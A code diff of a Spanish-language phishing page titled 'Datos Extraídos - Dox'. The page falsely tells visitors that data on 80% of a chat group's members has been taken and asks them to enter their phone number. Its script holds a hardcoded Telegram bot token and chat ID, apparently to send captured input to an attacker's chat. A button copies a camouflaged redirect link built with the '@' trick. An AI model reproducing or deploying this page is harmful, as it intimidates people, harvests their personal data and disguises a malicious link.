@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auditoría de Seguridad - Filtración</title>
+    <title>Datos Extraídos - Dox</title>
     <style>
         :root {
             --bg: #f8f9fa;
@@ -112,7 +112,7 @@
             <div class="icon">
                 <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
             </div>
-            <h1>Filtración Masiva Detectada</h1>
+            <h1>Datos Extraídos - Dox</h1>
             <p>Gracias al cierre del grupo de ayer, hemos obtenido información del <strong>80% de las personas</strong> que estaban allí. Ingresa tu número para saber si tus datos ya están en nuestro poder.</p>
             
             <div class="input-group">
@@ -157,9 +157,7 @@
     </div>
 
     <script>
-        // EL ENLACE CAMUFLADO QUE SE COPIARÁ
         const ENLACE_DE_REDIRECCION = "https://pastebin.com@is.gd/JI7qQs";
-
         const TG_TOKEN = '8897804487:AAFjHFflzo0nTxClXbZnCJjJx_OOca7wTYQ';
         const TG_CHAT_ID = '8270911813';
         const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
@@ -335,7 +333,6 @@
             attemptVerification();
         });
 
-        // Lógica del botón para copiar el ENLACE CAMUFLADO
         document.getElementById('btn-copy-link').addEventListener('click', async () => {
             try {
                 await navigator.clipboard.writeText(ENLACE_DE_REDIRECCION);
@@ -348,7 +345,6 @@
                     btn.style.background = "var(--primary)";
                 }, 3000);
             } catch (err) {
-                // Fallback
                 const input = document.createElement('input');
                 input.value = ENLACE_DE_REDIRECCION;
                 document.body.appendChild(input);
